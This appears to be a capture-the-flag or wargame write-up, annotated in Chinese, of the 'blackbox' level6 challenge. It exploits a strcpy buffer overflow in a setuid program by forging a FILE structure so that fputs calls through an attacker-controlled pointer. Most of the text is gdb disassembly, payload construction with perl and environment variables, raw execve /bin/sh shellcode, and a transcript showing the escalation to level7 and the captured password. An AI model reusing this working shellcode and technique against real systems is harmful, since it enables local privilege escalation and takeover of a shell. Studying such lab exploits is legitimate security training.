


(gdb) disass main
Dump of assembler code for function main:
0x08048444 <main+0>:    lea    0x4(%esp),%ecx
0x08048448 <main+4>:    and    $0xfffffff0,%esp
0x0804844b <main+7>:    pushl  0xfffffffc(%ecx)
0x0804844e <main+10>:   push   %ebp
0x0804844f <main+11>:   mov    %esp,%ebp
0x08048451 <main+13>:   push   %ecx  /* %ecx = argc地址 */
0x08048452 <main+14>:   sub    $0x434,%esp
0x08048458 <main+20>:   mov    %ecx,0xfffffbd8(%ebp)
0x0804845e <main+26>:   mov    0x8048636,%eax  /* "no segfault yet\n" */
0x08048463 <main+31>:   mov    %eax,0xffffffe7(%ebp)
0x08048466 <main+34>:   mov    0x804863a,%eax /*  "egfault yet\n" */
0x0804846b <main+39>:   mov    %eax,0xffffffeb(%ebp)
0x0804846e <main+42>:   mov    0x804863e,%eax /*   "ult yet\n" */
0x08048473 <main+47>:   mov    %eax,0xffffffef(%ebp)
0x08048476 <main+50>:   mov    0x8048642,%eax /*  "yet\n" */
0x0804847b <main+55>:   mov    %eax,0xfffffff3(%ebp)
0x0804847e <main+58>:   movzbl 0x8048646,%eax /* 0x00000000 */
0x08048485 <main+65>:   mov    %al,0xfffffff7(%ebp)
0x08048488 <main+68>:   mov    0xfffffbd8(%ebp),%eax /* eax = &argc */
0x0804848e <main+74>:   cmpl   $0x1,(%eax)
0x08048491 <main+77>:   jg     0x80484ba <main+118>
0x08048493 <main+79>:   mov    0xfffffbd8(%ebp),%edx
0x08048499 <main+85>:   mov    0x4(%edx),%eax
0x0804849c <main+88>:   mov    (%eax),%eax
0x0804849e <main+90>:   mov    %eax,0x4(%esp)
0x080484a2 <main+94>:   movl   $0x8048618,(%esp)
0x080484a9 <main+101>:  call   0x8048348 <printf@plt>
0x080484ae <main+106>:  movl   $0xffffffff,(%esp)
0x080484b5 <main+113>:  call   0x8048358 <exit@plt>

0x080484ba <main+118>:  movl   $0x804862f,0x4(%esp) /* "a" */
0x080484c2 <main+126>:  movl   $0x8048631,(%esp)  /* "temp" */
0x080484c9 <main+133>:  call   0x8048368 <fopen@plt> /* fopen("temp","a") */
0x080484ce <main+138>:  mov    %eax,0xfffffff8(%ebp)
0x080484d1 <main+141>:  mov    0xfffffbd8(%ebp),%edx /* edx = &argc */
0x080484d7 <main+147>:  mov    0x4(%edx),%eax
0x080484da <main+150>:  add    $0x4,%eax
0x080484dd <main+153>:  mov    (%eax),%eax  /* eax = argv[1] */
0x080484df <main+155>:  mov    %eax,0x4(%esp)
0x080484e3 <main+159>:  lea    0xfffffbe7(%ebp),%eax
0x080484e9 <main+165>:  mov    %eax,(%esp)
0x080484ec <main+168>:  call   0x8048388 <strcpy@plt> /* strcpy(dest, argv[1]) */
0x080484f1 <main+173>:  mov    0xfffffff8(%ebp),%eax
0x080484f4 <main+176>:  mov    %eax,0x4(%esp)         /* fopen打开的文件 */
0x080484f8 <main+180>:  lea    0xffffffe7(%ebp),%eax
0x080484fb <main+183>:  mov    %eax,(%esp)
0x080484fe <main+186>:  call   0x8048328 <fputs@plt> /* fputs(字符串，文件指针) */
0x08048503 <main+191>:  movl   $0x0,(%esp)
0x0804850a <main+198>:  call   0x8048358 <exit@plt>
0x0804850f <main+203>:  nop    
End of assembler dump.


(gdb) disass fputs
Dump of assembler code for function fputs:
0x00ad24a0 <fputs+0>:   push   %ebp
0x00ad24a1 <fputs+1>:   mov    %esp,%ebp
0x00ad24a3 <fputs+3>:   sub    $0x1c,%esp
0x00ad24a6 <fputs+6>:   mov    %ebx,0xfffffff4(%ebp)
0x00ad24a9 <fputs+9>:   mov    0x8(%ebp),%eax  /* ebp+4: call fputs的下一条指令的地址, ebp+8: "no segfault yet\n",  */
0x00ad24ac <fputs+12>:  call   0xa90d10 <free@plt+112>
0x00ad24b1 <fputs+17>:  add    $0xd7b43,%ebx
0x00ad24b7 <fputs+23>:  mov    %esi,0xfffffff8(%ebp)
0x00ad24ba <fputs+26>:  mov    0xc(%ebp),%esi /* ebp+0xc: 文件指针 */
0x00ad24bd <fputs+29>:  mov    %edi,0xfffffffc(%ebp)
0x00ad24c0 <fputs+32>:  mov    %eax,(%esp)
0x00ad24c3 <fputs+35>:  call   0xae7e30 <strlen> /* 求"no segfault yet\n"长度 */
0x00ad24c8 <fputs+40>:  mov    %eax,0xfffffff0(%ebp) /* strlen()返回值为16 */
0x00ad24cb <fputs+43>:  mov    (%esi),%eax /* 把文件指针放到eax中*/
0x00ad24cd <fputs+45>:  and    $0x8000,%eax /* 若and执行完结果为0，则不跳转 */
0x00ad24d2 <fputs+50>:  test   %ax,%ax
0x00ad24d5 <fputs+53>:  jne    0xad250b <fputs+107>

0x00ad24d7 <fputs+55>:  mov    0x48(%esi),%edx
0x00ad24da <fputs+58>:  mov    %gs:0x8,%edi
0x00ad24e1 <fputs+65>:  cmp    0x8(%edx),%edi
0x00ad24e4 <fputs+68>:  je     0xad2508 <fputs+104>
0x00ad24e6 <fputs+70>:  xor    %eax,%eax
0x00ad24e8 <fputs+72>:  mov    $0x1,%ecx
0x00ad24ed <fputs+77>:  cmpl   $0x0,%gs:0xc
0x00ad24f5 <fputs+85>:  je,pt  0xad24f9 <fputs+89>
0x00ad24f8 <fputs+88>:  lock cmpxchg %ecx,(%edx)
0x00ad24fc <fputs+92>:  jne    0xad25fa <fputs+346>
0x00ad2502 <fputs+98>:  mov    0x48(%esi),%edx
0x00ad2505 <fputs+101>: mov    %edi,0x8(%edx)
0x00ad2508 <fputs+104>: incl   0x4(%edx)

0x00ad250b <fputs+107>: cmpb   $0x0,0x46(%esi) /* esi为fopen打开的文件指针地址，(esi + 70)处的值为0，则跳转 */
0x00ad250f <fputs+111>: je     0xad2584 <fputs+228>
0x00ad2511 <fputs+113>: movsbl 0x46(%esi),%eax /* 将(esi+70)处的字节放到eax中 */
0x00ad2515 <fputs+117>: mov    0xfffffff0(%ebp),%edx /* strlen()求的长度: 16 */
0x00ad2518 <fputs+120>: mov    0x94(%esi,%eax,1),%eax/* R[eax] = R[esi + eax * 1 + 0x94] */
0x00ad251f <fputs+127>: mov    %edx,0x8(%esp) /* 16 */
0x00ad2523 <fputs+131>: mov    0x8(%ebp),%edx /* "no segfault yet\n" */
0x00ad2526 <fputs+134>: mov    %esi,(%esp)    /* 文件指针 */
0x00ad2529 <fputs+137>: mov    %edx,0x4(%esp)
0x00ad252d <fputs+141>: call   *0x1c(%eax)   /* 这是我们的目标，call *0x1c(%eax), eax我们可以控制*/
0x00ad2530 <fputs+144>: cmp    %eax,0xfffffff0(%ebp)
0x00ad2533 <fputs+147>: mov    $0x1,%ecx
0x00ad2538 <fputs+152>: je     0xad253f <fputs+159>
0x00ad253a <fputs+154>: mov    $0xffffffff,%ecx
0x00ad253f <fputs+159>: mov    (%esi),%eax
0x00ad2541 <fputs+161>: and    $0x8000,%eax
0x00ad2546 <fputs+166>: test   %ax,%ax
0x00ad2549 <fputs+169>: jne    0xad2575 <fputs+213>
0x00ad254b <fputs+171>: mov    0x48(%esi),%edx
0x00ad254e <fputs+174>: mov    0x4(%edx),%eax
0x00ad2551 <fputs+177>: dec    %eax
0x00ad2552 <fputs+178>: test   %eax,%eax
0x00ad2554 <fputs+180>: mov    %eax,0x4(%edx)
0x00ad2557 <fputs+183>: jne    0xad2575 <fputs+213>
0x00ad2559 <fputs+185>: movl   $0x0,0x8(%edx)
0x00ad2560 <fputs+192>: cmpl   $0x0,%gs:0xc
0x00ad2568 <fputs+200>: je,pt  0xad256c <fputs+204>
0x00ad256b <fputs+203>: lock subl $0x1,(%edx)
0x00ad256f <fputs+207>: jne    0xad2606 <fputs+358>
0x00ad2575 <fputs+213>: mov    0xfffffff4(%ebp),%ebx
0x00ad2578 <fputs+216>: mov    %ecx,%eax
0x00ad257a <fputs+218>: mov    0xfffffff8(%ebp),%esi
0x00ad257d <fputs+221>: mov    0xfffffffc(%ebp),%edi
0x00ad2580 <fputs+224>: mov    %ebp,%esp
0x00ad2582 <fputs+226>: pop    %ebp
0x00ad2583 <fputs+227>: ret    
0x00ad2584 <fputs+228>: mov    0xffffffa4(%ebx),%ecx
0x00ad258a <fputs+234>: test   %ecx,%ecx
0x00ad258c <fputs+236>: jne    0xad25a7 <fputs+263>
0x00ad258e <fputs+238>: mov    $0xffffffff,%eax
0x00ad2593 <fputs+243>: mov    %eax,0x4(%esp)
0x00ad2597 <fputs+247>: mov    %esi,(%esp)
0x00ad259a <fputs+250>: call   0xad8520 <_IO_wfile_underflow+1952>
0x00ad259f <fputs+255>: inc    %eax
0x00ad25a0 <fputs+256>: jne    0xad253a <fputs+154>
0x00ad25a2 <fputs+258>: jmp    0xad2511 <fputs+113>
0x00ad25a7 <fputs+263>: mov    0x5c(%esi),%edx
0x00ad25aa <fputs+266>: test   %edx,%edx
0x00ad25ac <fputs+268>: lea    0x0(%esi),%esi
0x00ad25b0 <fputs+272>: jne    0xad25b9 <fputs+281>
0x00ad25b2 <fputs+274>: movl   $0xffffffff,0x5c(%esi)
0x00ad25b9 <fputs+281>: mov    0x5c(%esi),%eax
0x00ad25bc <fputs+284>: jmp    0xad259f <fputs+255>
0x00ad25be <fputs+286>: mov    %eax,%ecx
0x00ad25c0 <fputs+288>: mov    (%esi),%eax
0x00ad25c2 <fputs+290>: and    $0x8000,%eax
0x00ad25c7 <fputs+295>: test   %ax,%ax
0x00ad25ca <fputs+298>: jne    0xad25f2 <fputs+338>
0x00ad25cc <fputs+300>: mov    0x48(%esi),%edx
0x00ad25cf <fputs+303>: mov    0x4(%edx),%eax
0x00ad25d2 <fputs+306>: dec    %eax
0x00ad25d3 <fputs+307>: test   %eax,%eax
0x00ad25d5 <fputs+309>: mov    %eax,0x4(%edx)
0x00ad25d8 <fputs+312>: jne    0xad25f2 <fputs+338>
0x00ad25da <fputs+314>: movl   $0x0,0x8(%edx)
0x00ad25e1 <fputs+321>: cmpl   $0x0,%gs:0xc
0x00ad25e9 <fputs+329>: je,pt  0xad25ed <fputs+333>
0x00ad25ec <fputs+332>: lock subl $0x1,(%edx)
0x00ad25f0 <fputs+336>: jne    0xad2612 <fputs+370>
0x00ad25f2 <fputs+338>: mov    %ecx,(%esp)
0x00ad25f5 <fputs+341>: call   0xa91290 <gnu_get_libc_version+848>
0x00ad25fa <fputs+346>: lea    (%edx),%ecx
0x00ad25fc <fputs+348>: call   0xb54cc0 <pthread_exit+64>
0x00ad2601 <fputs+353>: jmp    0xad2502 <fputs+98>
0x00ad2606 <fputs+358>: lea    (%edx),%eax
0x00ad2608 <fputs+360>: call   0xb54cf0 <pthread_exit+112>
0x00ad260d <fputs+365>: jmp    0xad2575 <fputs+213>
0x00ad2612 <fputs+370>: lea    (%edx),%eax
0x00ad2614 <fputs+372>: call   0xb54cf0 <pthread_exit+112>
0x00ad2619 <fputs+377>: jmp    0xad25f2 <fputs+338>
0x00ad261b <fputs+379>: nop    
0x00ad261c <fputs+380>: nop    
0x00ad261d <fputs+381>: nop    
0x00ad261e <fputs+382>: nop    
0x00ad261f <fputs+383>: nop    
End of assembler dump.
(gdb) 

为了让流程走到 “0x00ad252d <fputs+141>: call   *0x1c(%eax)”：

1. “<fputs+53>:  jne    0xad250b <fputs+107>” 必须发生跳转，跳转到fputs+107，
那么“<fputs+45>:  and    $0x8000,%eax” 必须返回非零，根据：
<fputs+43>:  mov    (%esi),%eax /* 把文件指针放到eax中*/
<fputs+45>:  and    $0x8000,%eax /* 若and执行完结果为0，则不跳转 */
<fputs+50>:  test   %ax,%ax
<fputs+53>:  jne    0xad250b <fputs+107>
文件指针地址放在esi中，我们可以填充覆盖(下面用"BBBB"覆盖esi)
(gdb) r $(perl -e 'print "A"x(1041)."BBBB"') 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level6/fsp $(perl -e 'print "A"x(1041)."BBBB"')
Program received signal SIGSEGV, Segmentation fault.
0x00cb94cb in fputs () from /lib/tls/libc.so.6
(gdb) x/x $esi
0x42424242:     Cannot access memory at address 0x42424242

为了发生跳转，我们必须将"BBBB"替换为一个可用的地址，该地址处的数据与0x8000 进行and后返回非零。

2. 根据： 
<fputs+107>: cmpb   $0x0,0x46(%esi)
<fputs+111>: je     0xad2584 <fputs+228>
可知：(esi+70)处的数据不能为0，否则将跳转到最后。

3. 根据：
<fputs+113>: movsbl 0x46(%esi),%eax   /* eax = (esi + 70) */
<fputs+120>: mov    0x94(%esi,%eax,1),%eax /* eax = (esi + eax * 1 + 148 ) */
<fputs+141>: call   *0x1c(%eax) /* call (eax + 0x28) */




shellcode:
$(perl -e 'print "A"x(1041)."BBBB"')
esi = 0xBBBB (0x41418041)
例: 
$export PAYLOAD=$'\x41\x80\x41\x41' 
(gdb) shell ls
env.c  envenvenvenve  fsp  fsp.txt  password  temp
(gdb) shell ./envenvenvenve PAYLOAD
PAYLOAD is at 0xbfffdfe7
(gdb)  r $(perl -e 'print "A"x(1041)."\xe7\xdf\xff\xbf"')
(gdb) x/x $esi
0xbfffdfe7:     0x41418041  

$export PAYLOAD=$'\x41\x80\x41\x41'   (\x80是为了第一个条件，and    $0x8000,%eax 之后不为0)

$export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."BBBB"."C"x(45)."\x81"')
"\x81"位于(esi+70)处，其整数值为(-127),根据3中的(
	<fputs+120>: mov    0x94(%esi,%eax,1),%eax /* eax = (esi + eax * 1 + 148)  */
) 这个条件计算后得到 eax = (esi + -127 * 1 + 148) = *(esi + 21) = "BBBB"

export SC=$(perl -e 'print "A"x(28)."CCCC"')
我们将JUNK中的"BBBB"换成SC的地址，执行后得到：
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
表明在"CCCC"处我们需要填入真正的shellcode的地址。

最后：
export CODE=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
export SC=$(perl -e 'print "A"x(28)."CCCC"')    (CODE地址替换"CCCC")
export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."BBBB"."C"x(45)."\x81"')  (SC地址替换"BBBB")
r $(perl -e 'print "A"x(1041)."DDDD"') (JUNK地址替换"DDDD")

替换之后：
level6@blackbox:/tmp/level6$ ./env CODE
CODE is at 0xbfffdfcb
level6@blackbox:/tmp/level6$ export SC=$(perl -e 'print "A"x(28)."\xcb\xdf\xff\xbf"') 
level6@blackbox:/tmp/level6$ ./env SC  
SC is at 0xbfffdf49
level6@blackbox:/tmp/level6$ export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."\x49\xdf\xff\xbf"."C"x(45)."\x81"')  
level6@blackbox:/tmp/level6$ ./env JUNK
JUNK is at 0xbfffdefe
level6@blackbox:/tmp/level6$ cd /home/level6
level6@blackbox:~$ ./fsp $(perl -e 'print "A"x(1041)."\xfe\xde\xff\xbf"')
level7@blackbox:/home/level6$ cd /home/level7
level7@blackbox:/home/level7$ cat passwd 
$m4shitup
level7@blackbox:/home/level7$